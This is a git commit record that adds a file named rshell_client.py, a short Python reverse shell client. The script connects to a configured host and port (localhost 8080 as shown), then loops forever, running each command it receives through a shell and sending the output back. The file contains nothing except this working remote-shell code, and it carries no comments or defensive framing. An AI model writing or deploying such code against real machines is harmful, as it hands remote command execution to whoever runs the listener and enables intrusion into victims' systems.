cef30a5756ea4ad9997fa793023c666e5996cfa7
Ataberk Yavuzer <SyraTR@users.noreply.github.com>
2016-04-26 02:37:36 +0300

    Added files via upload

---
+++ rshell_client.py
@@ -0,0 +1,20 @@
+import socket,subprocess
+
+host = "127.0.0.1"
+port = 8080
+buff = 2048	
+client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
+
+client_socket.connect((host,port))
+
+while True:
+	received_data = client_socket.recv(buff)
+	if received_data == 'quit' :
+		client_socket.close()
+	else :
+		command = subprocess.Popen([received_data],stdout=subprocess.PIPE,shell=True).communicate()[0]
+		client_socket.send(str(command))
+
+
+
